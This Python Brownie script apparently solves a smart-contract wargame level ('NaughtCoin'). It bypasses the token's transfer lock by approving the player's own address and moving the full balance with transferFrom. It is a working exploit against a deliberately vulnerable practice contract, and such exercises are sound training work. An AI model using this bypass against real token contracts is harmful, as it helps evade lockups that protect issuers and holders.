from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=15, player=player)

    contract = interface.INaughtCoin(instance_address)

    balance = contract.balanceOf(player)
    print(f"Player's balance: {Web3.fromWei(balance, 'ether')}")
    
    tx = contract.approve(player, balance, {"from": player})
    tx.wait(1)
    tx = contract.transferFrom(player, instance_address, balance, {"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)